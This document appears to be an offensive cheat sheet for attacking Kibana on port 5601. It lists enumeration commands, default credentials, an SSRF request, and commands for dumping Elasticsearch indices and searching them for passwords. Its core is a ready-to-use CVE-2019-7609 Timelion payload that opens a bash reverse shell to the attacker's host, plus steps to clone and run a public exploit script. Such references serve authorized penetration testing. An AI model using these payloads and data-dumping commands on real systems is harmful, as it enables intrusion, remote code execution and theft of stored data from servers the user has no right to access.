# Port 5601 - Kibana

## Table of Contents
- [Enumeration](#enumeration)
- [Default Credentials](#default-credentials)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
curl -s "http://$rhost:5601/api/status" | jq '.version'
```

### Nmap

```shell
nmap -sV -sC -p 5601 $rhost
```

### Web Enumeration

```shell
# Check version
curl -s "http://$rhost:5601/api/status" | jq '.version'

# Check status
curl -s "http://$rhost:5601/api/status" | jq
```

### Access Web Interface

```
http://$rhost:5601
http://$rhost:5601/app/kibana
http://$rhost:5601/status
```

---

## Default Credentials

| Username | Password |
| :--- | :--- |
| elastic | changeme |
| kibana | kibana |
| admin | admin |

---

## Exploitation

### CVE-2019-7609 - Kibana LFI/RCE

> Affected: Kibana < 6.6.1, < 5.6.15

```shell
# LFI to RCE via Timelion
# Navigate to Timelion and use:

.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i >& /dev/tcp/$lhost/$lport 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

### Using Exploit Script

```shell
# Clone exploit
git clone https://github.com/mpgn/CVE-2019-7609.git
cd CVE-2019-7609

# Run exploit
python CVE-2019-7609-kibana-rce.py -u http://$rhost:5601 -host $lhost -port $lport --shell
```

### CVE-2021-3172 - SSRF

```shell
# Server-Side Request Forgery
curl -X POST "http://$rhost:5601/api/console/proxy?path=http://internal:9200/&method=GET"
```

### Elasticsearch Queries via Kibana

```
# Dev Tools -> Console

# List indices
GET /_cat/indices

# Get all documents
GET /index_name/_search?pretty

# Search for sensitive data
GET /_all/_search?q=password

# Get mappings
GET /index_name/_mapping
```

### API Endpoints

```shell
# List all indices
curl -s "http://$rhost:5601/api/console/proxy?path=%2F_cat%2Findices&method=GET"

# Get data
curl -s "http://$rhost:5601/api/console/proxy?path=%2Findex_name%2F_search&method=GET"
```

---

## Enumeration via Elasticsearch

> Kibana connects to Elasticsearch (port 9200)

```shell
# Direct Elasticsearch access
curl -s "http://$rhost:9200/_cat/indices"
curl -s "http://$rhost:9200/_search?pretty"
curl -s "http://$rhost:9200/_all/_search?q=password"
```

---

## Quick Reference

| URL | Description |
| :--- | :--- |
| `http://$rhost:5601/status` | Kibana status |
| `http://$rhost:5601/api/status` | API status |
| `http://$rhost:5601/app/dev_tools` | Dev Tools console |
| `http://$rhost:5601/app/discover` | Discover data |
